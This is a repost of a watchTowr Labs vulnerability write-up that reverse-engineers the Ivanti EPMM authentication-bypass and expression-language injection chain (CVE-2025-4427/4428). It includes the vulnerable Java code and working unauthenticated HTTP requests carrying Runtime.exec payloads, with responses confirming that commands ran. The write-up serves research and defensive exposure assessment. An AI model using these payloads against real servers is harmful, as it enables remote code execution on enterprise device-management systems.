<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="renderer" content="webkit"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/libs/highlight/styles/18k.css"><meta name="generator" content="Hexo 7.3.0"></head><body id="bodyx"><div class="hd posts"><a href="javascript:history.back()" class="replay-btn">返回</a><div class="post-title"><p>Expression Payloads Meet Mayhem - Ivanti EPMM Unauth RCE Chain (CVE-2025-4427 and CVE-2025-4428)</p><hr></div><div class="post-content"><p>Expression Payloads Meet Mayhem - Ivanti EPMM Unauth RCE Chain (CVE-2025-4427 and CVE-2025-4428)</p><ul><li><a target="_blank" rel="noopener" href="https://labs.watchtowr.com/">Home</a></li><li><a target="_blank" rel="noopener" href="https://watchtowr.com/">The watchTowr Platform</a></li><li><a target="_blank" rel="noopener" href="https://watchtowr.com/demo/">Request A Demo</a></li><li><a target="_blank" rel="noopener" href="https://labs.watchtowr.com/vulnerability-disclosure-policy/">Vuln. Disclosure Policy</a></li></ul><p>By — <a href="/author/sonny/">Sonny</a> — <a href="/author/piotr/">Piotr Bazydlo (@chudyPB)</a><br>  —  <br>May 15, 2025</p><h1 id="Expression-Payloads-Meet-Mayhem-Ivanti-EPMM-Unauth-RCE-Chain-CVE-2025-4427-and-CVE-2025-4428"><a href="#Expression-Payloads-Meet-Mayhem-Ivanti-EPMM-Unauth-RCE-Chain-CVE-2025-4427-and-CVE-2025-4428" class="headerlink" title="Expression Payloads Meet Mayhem - Ivanti EPMM Unauth RCE Chain (CVE-2025-4427 and CVE-2025-4428)"></a>Expression Payloads Meet Mayhem - Ivanti EPMM Unauth RCE Chain (CVE-2025-4427 and CVE-2025-4428)</h1><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_3.jpg" alt="Expression Payloads Meet Mayhem - Ivanti EPMM Unauth RCE Chain (CVE-2025-4427 and CVE-2025-4428)"></p><p>Keeping your ears to the ground and eyes wide open for the latest vulnerability news at watchTowr is a given. Despite rummaging through enterprise code looking for 0days on a daily basis, our interest was piqued this week when news of fresh vulnerabilities was announced in a close friend - Ivanti, and their Endpoint Manager Mobile (Ivanti EPMM) solution.</p><p>For those out of the loop, don’t worry - as always, we’re here to fill you in.</p><p>Ivanti Endpoint Manager Mobile (EPMM) is an MDM solution for system administrators to install and manage devices within an organization. It hopes to prevent you from installing malware or enjoying your life by watching YouTube during any permitted and sanctioned downtime.</p><h2 id="Why-Is-This-Important"><a href="#Why-Is-This-Important" class="headerlink" title="Why Is This Important?"></a>Why Is This Important?</h2><p>Well, short of their intended functionality, MDM solutions are, in a sense, C2 frameworks for enterprises… allowing system administrators to manage software on their devices.</p><p>Picture this: You’ve compromised the MDM solution at one of the largest banks and are able to deploy malicious software at scale to employee devices.</p><p>And it’s Friday!</p><p>It sounds farfetched to compromise such a hardened enterprise security appliance, but history has shown that attackers are specifically targeting them.</p><p>In 2023, several similar vulnerabilities emerged that were being actively exploited in the wild for Ivanti EPMM. Specifically, <code>CVE-2023-35078</code> and <code>CVE-2023-35082</code>, where attackers were able to access restricted APIs in EPMM without authentication.</p><p>Unfortunately, per public reporting, these vulnerabilities were used to access and compromise parts of the <a target="_blank" rel="noopener" href="https://therecord.media/hackers-use-ivanti-zero-day-to-attack-norway-ministries?ref=labs.watchtowr.com">Norwegian government</a> and others.</p><h2 id="Move-On-watchTowr-What’s-Going-On-Today"><a href="#Move-On-watchTowr-What’s-Going-On-Today" class="headerlink" title="Move On watchTowr, What’s Going On Today?"></a>Move On watchTowr, What’s Going On Today?</h2><p>Alright, alright - we’re getting there.</p><p>In this week’s episode of “advisories issued by Ivanti” - <a target="_blank" rel="noopener" href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM?language=en_US&ref=labs.watchtowr.com">https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM?language=en_US</a>, we see that two vulnerabilities have been detailed:</p><table><thead><tr><th><strong>CVE Number</strong></th><th><strong>Description</strong></th><th><strong>CVSS Score (Severity)</strong></th><th><strong>CVSS Vector</strong></th><th><strong>CWE</strong></th></tr></thead><tbody><tr><td><strong>CVE-2025-4427</strong></td><td>An authentication bypass in Ivanti Endpoint Manager Mobile allowing attackers to access protected resources without proper credentials.</td><td>5.3 (Medium)</td><td>CVSS:3.0&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:L&#x2F;I:N&#x2F;A:N</td><td>CWE-288</td></tr><tr><td><strong>CVE-2025-4428</strong></td><td>A remote code execution vulnerability in Ivanti Endpoint Manager Mobile allowing attackers to execute arbitrary code on the target system</td><td>7.2 (High)</td><td>CVSS:3.0&#x2F;AV:N&#x2F;AC:L&#x2F;PR:H&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</td><td>CWE-94</td></tr></tbody></table><p>To give more context as to why these are of such importance, Ivanti has provided the following commentary:</p><blockquote><p>When chained together, successful exploitation could lead to unauthenticated remote code execution.…We are aware of a very limited number of customers who have been exploited at the time of disclosure.</p></blockquote><p>Yikes. Vague, mysterious comments - but with all the big words that make you wonder if the CVSS scores of 5.3 and 7.2 are really a leading indicator of pain.</p><p>As always, in all vendor advisories, there’s quite a bit to unpack - but a few interesting points stood out to us:</p><ul><li>Combined, this is vulnerability chain for Pre-Authenticated Remote Code Execution.</li><li>These vulnerabilities are under active exploitation against a <strong>very limited number</strong> of targets (This tells us it’s highly targeted, someone really wanted in - or Ivanti have limited data).</li></ul><p>What we know though for sure is - once ‘highly targeted’ operations get publicised, we’ve seen attackers just mass pwn everything on the Internet to obtain any remaining value.</p><p>The last point worth highlighting is a statement released by Ivanti in their Q&amp;A section of the advisory:</p><blockquote><p>What code is affected? Is it Ivanti’s code?</p></blockquote><blockquote><p>No. The vulnerabilities are associated with two open-source libraries integrated into EPMM. The use of open-source code is standard practice used by all major technology companies.</p></blockquote><p>Hm..</p><p>For avoidance of doubt, the following versions of Ivanti EPMM are patched:</p><ul><li>11.12.0.5</li><li>12.3.0.2</li><li>12.4.0.2</li><li>12.5.0.1</li></ul><h2 id="Move-On-watchTowr-Just-Reverse-It"><a href="#Move-On-watchTowr-Just-Reverse-It" class="headerlink" title="Move On watchTowr, Just Reverse It"></a>Move On watchTowr, Just Reverse It</h2><p>For the purposes of clarity in our efforts to <code>diff</code> a vulnerable and a patched instance, we deployed and compared two versions of Ivanti Endpoint Manager Mobile (EPMM):</p><ul><li>Vulnerable - 12.5.0.0-48</li><li>Patched - - 12.5.0.1-13</li></ul><p>As always with EPMM, we see many exposed interfaces but specifically as always the web interface exposed on 443&#x2F;TCP - supported by Tomcat to provide a Java application - with the main application residing in <code>/mi/tomcat/webapps/mifs/</code>.</p><h2 id="CVE-2025-4428-Post-Authenticated-Remote-Code-Execution"><a href="#CVE-2025-4428-Post-Authenticated-Remote-Code-Execution" class="headerlink" title="CVE-2025-4428: Post-Authenticated Remote Code Execution"></a>CVE-2025-4428: Post-Authenticated Remote Code Execution</h2><p>Given the minimal differences between the codebases, the possibility of uncovering the Authentication Bypass initially seemed quite remote.</p><p>So, we decided to begin our analysis with the Post-authenticated Remote Code Execution vulnerability (CVE-2025-4428).</p><p>Our thinking was that if we could first identify the vulnerable endpoint, it might naturally lead us to insights that would help uncover the Authentication Bypass (CVE-2025-4427).</p><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_4.jpg"></p><p>Looking back at the <a target="_blank" rel="noopener" href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM?language=en_US&ref=labs.watchtowr.com">Ivanti statement within their advisory</a>, we had a suspicion - are we looking for an 0day in a 3rd party library, used post-auth only and under CWE-94 - Improper Control of Generation of Code (‘Code Injection’)?</p><p>Well, starting with this suspicion that we do somehow need to identify an 0day in a 3rd party library, let’s try to see what libraries have been swapped within the <code>mifs.war</code> between our two versions:</p><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_5.jpg"><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_6.jpg"></p><p>After a brief review, we can see that Ivanti had amended and upgraded the <code>hibernate-validator</code> library. This kind of makes sense, when you look at the <code>diff</code> of both vulnerable and patched versions:</p><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_7.jpg"></p><p>We can see that both <code>ScepSubjectValidator</code> and <code>DeviceFeatureUsageReportQueryRequestValidator</code> classes had been modified.</p><p>The <code>Validator</code> in both names suggests that we may be, in fact, dealing with the <code>hibernate-validator</code> library and its infamous <code>ConstraintValidatorContext</code>  functionality.</p><p>Let us <a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2020-020-hibernate-validator/?ref=labs.watchtowr.com">quote Alvaro Munoz</a>:</p><blockquote><p>The <a target="_blank" rel="noopener" href="https://docs.jboss.org/hibernate/stable/validator/reference/en-US/html_single/?v=6.1&ref=labs.watchtowr.com#_the_code_constraintvalidatorcontext_code"><code>ConstraintValidatorContext</code> documentation</a> specifies that developers should be very careful when integrating user input into a custom message template as it will be interpreted by the Expression Language engine, which may allow attackers to run arbitrary Java code.</p></blockquote><p>The CWE suggests that we are dealing with a Code Injection, and now with the context of the references to <code>hibernate-validator</code> (where validators may allow us to execute Java Expression Language), this is beginning to sound like a rabbit hole worth our time.</p><p>First of all, let’s focus on <code>DeviceFeatureUsageReportQueryRequestValidator</code> , and specifically the unpatched code:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">implements ConstraintValidator&lt;ValidDeviceFeatureUsageReportQueryRequest, DeviceFeatureUsageReportQueryRequest&gt;<br>&#123;  <br>  @Autowired<br>  private LocalizedMessageBuilder localizedMessageBuilder;<br>  <br>  public void initialize(ValidDeviceFeatureUsageReportQueryRequest constraintAnnotation) &#123;&#125;<br>  <br>  public boolean isValid(DeviceFeatureUsageReportQueryRequest value, ConstraintValidatorContext context) &#123;<br>    String format = value.getFormat(); // [1]<br>    if (format == null) &#123;<br>      return true;<br>    &#125;<br>    <br>    boolean isValid = (format.equalsIgnoreCase(&quot;json&quot;) || format.equalsIgnoreCase(&quot;csv&quot;)); // [2]<br>    if (!isValid) &#123;<br>      String formatMessage = this.localizedMessageBuilder.getLocalizedMessage((MessageCode)MessageKeys.DEVICE_FEATURE_USAGE_INVALID_FORMAT, new Object[] &#123; format &#125;); // [3]<br>      <br>      context.disableDefaultConstraintViolation();<br>      context.buildConstraintViolationWithTemplate(formatMessage).addConstraintViolation();<br>    &#125; <br>    <br>    return isValid;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>At <code>[1]</code>, it retrieves the <code>format</code> parameter from the user-controlled data.</li><li>At <code>[2]</code>, it checks if the <code>format</code> parameter is equal to <code>json</code> or <code>csv</code>.</li><li>If not, it will include our <code>format</code> string in the error message that will be generated at <code>[3]</code>.</li></ul><p>Now, let’s have a look at the patched version:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">implements ConstraintValidator&lt;ValidDeviceFeatureUsageReportQueryRequest, DeviceFeatureUsageReportQueryRequest&gt;<br>&#123;<br>  @Autowired<br>  private LocalizedMessageBuilder localizedMessageBuilder;<br>  <br>  public void initialize(ValidDeviceFeatureUsageReportQueryRequest constraintAnnotation) &#123;&#125;<br>  <br>  public boolean isValid(DeviceFeatureUsageReportQueryRequest value, ConstraintValidatorContext context) &#123;<br>    String format = value.getFormat();<br>    if (format == null) &#123;<br>      return true;<br>    &#125;<br>    <br>    boolean isValid = (format.equalsIgnoreCase(&quot;json&quot;) || format.equalsIgnoreCase(&quot;csv&quot;));<br>    if (!isValid) &#123;<br>      String formatMessage = this.localizedMessageBuilder.getLocalizedMessage((MessageCode)MessageKeys.DEVICE_FEATURE_USAGE_INVALID_FORMAT, new Object[] &#123; &quot;&quot; &#125;); // [1]<br>      <br>      context.disableDefaultConstraintViolation();<br>      context.buildConstraintViolationWithTemplate(formatMessage).addConstraintViolation();<br>    &#125; <br>    <br>    return isValid;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Have a look at <code>[1]</code> - our <code>format</code> value is no longer reflected in the error message!</p><p>Put very simply - in our unpatched version, attacker&#x2F;user input will be passed into <code>localizedMessageBuilder.getLocalizedMessage</code> , whereas there’s no attacker-controlled input is passed into said method in the patched version.</p><p>Okay, so we have a clue on where to continue - and we need to track down this <code>localizedMessageBuilder.getLocalizedMessage</code> method.</p><p>As a spoiler, it’s implemented in Ivanti’s <code>com.mobileiron.vsp.rest.domain.LocalizedMessageBuilder</code> class:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">public class LocalizedMessageBuilder &#123;<br>    @Autowired<br>    protected MessageSource apiMessageSource;<br><br>    public String getLocalizedMessage(MessageCode messageCode, Object... messageParameters) &#123;<br>        return this.localize(messageCode.getMessageKey(), messageParameters); <br>    &#125;<br><br>    private String localize(String messageKey, Object... messageParameters) &#123;<br>        return this.apiMessageSource == null ? messageKey : this.apiMessageSource.getMessage(messageKey, messageParameters, (Locale)null); // [1]<br>    &#125;<br>    //...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>At <code>[1]</code>, this class calls <code>MessageSource.getMessage</code> .</p><p>Good news though - we fully control the second argument: <code>messageParameters</code>. It’s an array of objects, and the first object will be equal to our string!</p><p>Now, if we track down the <code>messageKey</code> for our scenario, we will see the following:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@Localize(<br>      value = &quot;Format &#x27;&#x27;&#123;0&#125;&#x27;&#x27; is invalid. Valid formats are &#x27;&#x27;json&#x27;&#x27;, &#x27;&#x27;csv&#x27;&#x27;.&quot;,<br>      key = &quot;com.mobileiron.vsp.messages.device.feature.usage.report.invalid.format&quot;<br>   )<br><br></code></pre></td></tr></table></figure><p>This is clearly getting interesting!</p><p><code>MessageSource</code> is <code>com.mobileiron.api.messages.ApiMessageSource</code>, which seems to extend Spring Framework <code>AbstractMessageSource</code>!</p><p>For those following this quickly vomited blogpost at home, it may all feel quite complex as of now - but let’s sum it up simply:</p><ol><li>We have the Ivanti <code>DeviceFeatureUsageReportQueryRequestValidator</code> validator.</li><li>Which allows us to reach the Spring <code>AbstractMessageSource.getMessage</code> method.</li><li>The error message string directly includes the attacker-controlled string through <code>&#123;0&#125;</code> syntax.</li><li>Our string is passed through <code>AbstractMessageSource.getMessage</code> second argument: <code>Object[] args</code>.</li></ol><p>Given our experience here, we’re likely deaing with something that may be vulnerable to Expression Language Injection!</p><p>Depending on the configuration and stars alignment, there’s a chance that the EL expression included in the attacker-controlled string (<code>format</code> parameter) will be evaluated.</p><p>As always, we don’t have much time when rapidly reacting to our client base to determine their exposure, so we decided to try this idea out through a simple experiment.</p><p>First of all, we need to identify where the <code>DeviceFeatureUsageReportQueryRequestValidator</code> is being used.</p><p>We quickly tracked it down to the <code>DeviceFeatureUsageReportController</code> and the following sample API method:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@PreAuthorize(&quot;hasPermissionForSpace(#adminDeviceSpaceId, &#123;&#x27;PERM_FEATURE_USAGE_DATA_VIEW&#x27;&#125;)&quot;)<br>@RequestMapping(method = &#123;RequestMethod.GET&#125;, value = &#123;&quot;/api/v2/featureusage&quot;&#125;)<br>@ResponseBody<br>@ApiOperation(value = &quot;Download Device Feature Usage Report&quot;, notes = &quot;Download Device Feature Usage Report&quot;, tags = &#123;&quot;DeviceFeatureUsage: All device feature usage related API&quot;&#125;)<br>@ApiResponses(&#123;@ApiResponse(code = 500, message = &quot;Internal Server Error&quot;)&#125;)<br>@PublicApi<br>public Response downloadDeviceFeatureUsageReport(@Valid @ModelAttribute DeviceFeatureUsageReportQueryRequest queryRequest, @RequestParam(defaultValue = &quot;0&quot;) int adminDeviceSpaceId, @ApiIgnore Locale locale, @ApiIgnore HttpServletResponse httpServletResponse) throws IOException &#123;<br>  Response response = setResponseSuccess(httpServletResponse, locale);<br>  <br>  try &#123;<br>    this.deviceFeatureUsageReportService.downloadDeviceFeatureUsageReport(getCurrentUserName(), queryRequest, httpServletResponse);<br>  &#125; catch (ResultNotFoundException e) &#123;<br>    MessageKeys messageKeys; httpServletResponse.setStatus(HttpStatus.NOT_FOUND.value());<br>    <br>    if (StringUtils.isNotBlank(queryRequest.getDatafile())) &#123;<br>      messageKeys = MessageKeys.DEVICE_FEATURE_USAGE_DATAFILE_NOT_FOUND;<br>    &#125; else &#123;<br>      messageKeys = MessageKeys.DEVICE_FEATURE_USAGE_NOT_FOUND;<br>    &#125; <br>    setErrorResponse((MessageCode)messageKeys, locale, HttpStatus.NOT_FOUND, response, httpServletResponse);<br>  &#125; <br>  return response;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Then, we can confirm that the <code>DeviceFeatureUsageReportQueryRequest</code> contains the <code>format</code> parameter:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">public class DeviceFeatureUsageReportQueryRequest extends QueryRequestWithPagination &#123;<br>  public static final SortOrder DEFAULT_SORT_ORDER = SortOrder.DESC;<br>  <br>  public static final String DEFAULT_SORT_COLUMN_NAME = &quot;job_fired_at&quot;;<br>  private String format = &quot;json&quot;;<br><br>  <br>  private String datafile;<br><br>  <br>  public DeviceFeatureUsageReportQueryRequest() &#123;<br>    this.sortOrder = SortOrder.DESC;<br>  &#125;<br>  <br>  public String getFormat() &#123;<br>    return this.format;<br>  &#125;<br>  //...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Finally, let’s try to inject some code through Java EL via basic HTTP requests. As we haven’t yet determined the Authentication Bypass vulnerability, these tests are performed while authenticated as an Ivanti EPMM administrator.</p><p>Specifically, we send this request below - that attempts to evaluate the multiplication of 7*7 - if vulnerable, we should see the number ‘49’ after the word ‘watchTowr’.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /mifs/admin/rest/api/v2/featureusage?format=watchTowr%24%7b7*7%7d HTTP/1.1<br>Host: 192.168.111.148<br>Cookie: ...<br><br><br></code></pre></td></tr></table></figure><p>This provide the following response:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;messages&quot;:[&#123;&quot;type&quot;:&quot;Error&quot;,&quot;messageKey&quot;:&quot;com.mobileiron.vsp.messages.validation.global.error&quot;,&quot;localizedMessage&quot;:&quot;Format &#x27;watchTowr49&#x27; is invalid. Valid formats are &#x27;json&#x27;, &#x27;csv&#x27;.&quot;,&quot;messageParameters&quot;:[&quot;Format &#x27;watchTowr49&#x27; is invalid. Valid formats are &#x27;json&#x27;, &#x27;csv&#x27;.&quot;]&#125;]&#125;<br><br></code></pre></td></tr></table></figure><p>Boom! The response body including the string <code>watchTowr49</code> shows that our multiplication was executed, and we are indeed dealing with the EL injection!</p><p>Let’s also confirm it with our debugger:</p><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_8.jpg"></p><p>As always, we scratched our head - good progress, but what is going on?</p><p>Ivanti mentioned a 0day in a 3rd party library - perhaps, we thought, maybe there are “fancy” protections in place to protect against dangerous EL payloads that can be bypassed, due to a supposed 0day in the <code>hibernate-validator</code>?</p><p>Before we begin overthinking things, we just.. decided to try a simple and typical payload for this class of vulnerability:</p><p><code>$&#123;&quot;&quot;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;).invoke(null).exec(&#39;touch /tmp/poc&#39;)&#125;</code></p><p>HTTP request (still auth’d as our Ivanti EPMM administrator):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /mifs/admin/rest/api/v2/featureusage?format=&lt;@urlencode&gt;$&#123;&quot;&quot;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null).exec(&#x27;touch /tmp/poc&#x27;)&#125;&lt;/@urlencode&gt; HTTP/1.1<br>Host: 192.168.111.148<br>Cookie: ...<br><br></code></pre></td></tr></table></figure><p>Looking at the file system, aaaand:</p><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_9.jpg"></p><p>Oh, okay. Maybe, once again, we were over thinking things?</p><p>Our command got successfully executed (as demonstrated by the created file), and we didn’t have to leverage any fancy 0days in <code>hibernate-validator</code> , Spring or any other included library.</p><p>Our current analysis shows that Ivanti EPMM passes an attacker-controlled array of objects to the <code>AbstractMessageSource.getMessage</code> (As we’ve demonstrated, we control the first object, which is a string). Subsequently, the error message shown dynamically includes this argument, which leads to the EL evaluation vulnerability we’ve just demonstrated..</p><h2 id="CVE-2025-4427-Authentication-Bypass"><a href="#CVE-2025-4427-Authentication-Bypass" class="headerlink" title="CVE-2025-4427 - Authentication Bypass"></a>CVE-2025-4427 - Authentication Bypass</h2><p>Having demonstrated and reproduced the Post Authenticated Remote Code Execution (<strong>CVE-2025-4428</strong>) vulnerability, it was time to focus on reproducing the other vulnerability in this already in-the-wild exploited vulnerability chain - the Authentication Bypass, that we affectionately call CVE-2025-4427.</p><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_10.jpg"></p><p>Our objective is now simple: somehow, we need to hit the <code>/api/v2/featureusage_history</code> endpoint (used in CVE-2025-4428) without authentication.</p><p>Looking back at our differentials between the patched and vulnerable versions of Ivanti EPMM mentioned above - one thing that stood out very clearly, within routing data in the <code>security.xml</code> file.</p><p>In a Spring application’s <code>security.xml</code> file, routes are secured using <code>&lt;intercept-url&gt;</code> elements that specify URL patterns and required authorization levels.</p><p>These Ant-style patterns (like <code>/admin/**</code>) are processed in order, allowing different security levels for various application areas - from public access paths to role-restricted sections requiring specific permissions like “USER” or “ADMIN”.</p><p>On first glance, we can observe that quite a large change has been made to the route <code>/rs/api/v2/**</code> in the patched version of Ivanti’s EPMM:</p><p>Vulnerable version:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;sec:http pattern=&quot;/rs/api/v2/**&quot; create-session=&quot;stateless&quot; use-expressions=&quot;false&quot; disable-url-rewriting=&quot;false&quot; authentication-manager-ref=&quot;authenticationManager&quot;&gt;<br><br></code></pre></td></tr></table></figure><p>Patched version:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;sec:http pattern=&quot;/rs/api/v2/**&quot; create-session=&quot;stateless&quot; disable-url-rewriting=&quot;false&quot; authentication-manager-ref=&quot;authenticationManager&quot;&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/Enrollment/RegMode.enroll&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Protected by MIMutualAuthEnrollmentFilter --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/Enrollment/CertReq.enroll&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Protected by MIMutualAuthEnrollmentFilter --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/Enrollment/enroll-capabilities&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Initial enrollment capabilities request --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/Enrollment/cert-mode/migrate&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Protected by MIClientCookieAuthFilter --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/Enrollment/cert-mode/enroll&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Protected by password validation inside EnrollmentService.registerDevice --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/Enrollment/cert-mode/renewExpiredCert&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Protected by MIClientCookieAuthFilter --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/ma/azurejoinstatus&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- protected by MIClientCookieAuthFilter --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/azurejoinstatus&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- protected by MIClientCookieAuthFilter --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/appstore/apps/**/download&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- protected by JWT token validation --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/component/macos/script/result&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- protected by MIProtocolAuthenticationFilter for CBA --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/device/registration&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Initial Login prompt for Windows registration --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/rs/api/v2/tos/reg/**&quot; access=&quot;permitAll&quot;/&gt; &lt;!-- Protected by token validation inside controller method --&gt;<br>   &lt;sec:intercept-url pattern=&quot;/**&quot; access=&quot;isAuthenticated()&quot;/&gt;<br><br></code></pre></td></tr></table></figure><p>Looking at this change, we can extrapolate a few things:</p><ul><li>Individual endpoints are now defined to allow anonymous users via <code>permitAll</code></li><li>All endpoints are checked for authentication via <code>isAuthenticated</code></li></ul><p>This lines up with the idea that potentially the RCE endpoint we’ve discovered previously can somehow be reached pre-authenticated, and it’s related to the prefix <code>/rs/api/v2/</code>.</p><p>At this point, it would be disingenuous to state that we hadn’t tried just… accessing the endpoint without authentication…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /mifs/rs/api/v2/featureusage?format=$%7b8*8%7d HTTP/1.1<br>Host: Hostname<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;messages&quot;:[&#123;&quot;type&quot;:&quot;Error&quot;,&quot;messageKey&quot;:&quot;com.mobileiron.vsp.messages.validation.global.error&quot;,&quot;localizedMessage&quot;:&quot;Format &#x27;64&#x27; is invalid. Valid formats are &#x27;json&#x27;, &#x27;csv&#x27;.&quot;,&quot;messageParameters&quot;:[&quot;Format &#x27;64&#x27; is invalid. Valid formats are &#x27;json&#x27;, &#x27;csv&#x27;.&quot;]&#125;]&#125;<br><br></code></pre></td></tr></table></figure><p>Sigh. “Authentication Bypass” zzzzzz.</p><p>Just like that, we’ve seemingly replicated <strong>CVE-2025-4427</strong> - but as always, we cant’t help but wonder about t why this vulnerability works this way.</p><p>Specifically, if we remove the <code>format</code> parameter from the same request, the vulnerable Ivanti EPMM appliance responds with an HTTP status code <code>401 unauthorized</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;messages&quot;:[&#123;&quot;type&quot;:&quot;Error&quot;,&quot;messageKey&quot;:&quot;com.mobileiron.vsp.messages.http.401&quot;,&quot;localizedMessage&quot;:&quot;Unauthorized&quot;&#125;]&#125;<br><br></code></pre></td></tr></table></figure><p>Using our debugger, we stuck a breakpoint at the moment the template is evaluated in <code>DeviceFeatureUsageReportQueryRequestValidator.class</code>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">context.buildConstraintViolationWithTemplate(formatMessage).addConstraintViolation();<br><br></code></pre></td></tr></table></figure><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_11.jpg"></p><p>Looking through the stack above, we can see that the validators are processed before the sink of the spring controller is reached.</p><p>Meaning that, in our opinion, there isn’t really an “Authentication Bypass” - what we’re looking at is actually an order of operations vulnerability. We confirmed this by break-pointing the controller, where we observed no execution from a pre-authenticated perspective.</p><h2 id="Many-Words-Little-Time-Just-Show-It"><a href="#Many-Words-Little-Time-Just-Show-It" class="headerlink" title="Many Words, Little Time - Just Show It"></a>Many Words, Little Time - Just Show It</h2><p>Now that we’ve reproduced both the “Authentication Bypass” (<strong>CVE-2025-4427)</strong> and the Remote Code Execution (<strong>CVE-2025-4428),</strong> as always it’s time to pull them together.</p><p>Whilst the output of the command is not apparent in the response, we can demonstrate in the below HTTP request and response that we can supply a payload that executes the command <code>id</code> :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /mifs/rs/api/v2/featureusage?format=&lt;@urlencode&gt;$&#123;&quot;&quot;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null).exec(&#x27;id&#x27;)&#125;&lt;/@urlencode&gt; HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HTTP/1.1 400 <br>Date: Thu, 15 May 2025 14:09:20 GMT<br>Server: server<br>X-XSS-Protection: 1; mode=block<br>Referrer-Policy: strict-origin-when-cross-origin<br>X-Frame-Options: SameOrigin<br>X-Content-Type-Options: nosniff<br>Expires: Mon, 05 May 2025 14:09:20 GMT<br>Pragma: no-cache<br>Cache-control: no-cache, no-store, must-revalidate<br>Strict-Transport-Security: max-age=31536000 ; includeSubDomains<br>Content-Type: application/json;charset=UTF-8<br>Content-Length: 341<br>Connection: close<br><br>&#123;&quot;messages&quot;:[&#123;&quot;type&quot;:&quot;Error&quot;,&quot;messageKey&quot;:&quot;com.mobileiron.vsp.messages.validation.global.error&quot;,&quot;localizedMessage&quot;:&quot;Format &#x27;Process[pid=26803, exitValue=\\&quot;not exited\\&quot;]&#x27; is invalid. Valid formats are &#x27;json&#x27;, &#x27;csv&#x27;.&quot;,&quot;messageParameters&quot;:[&quot;Format &#x27;Process[pid=26803, exitValue=\\&quot;not exited\\&quot;]&#x27; is invalid. Valid formats are &#x27;json&#x27;, 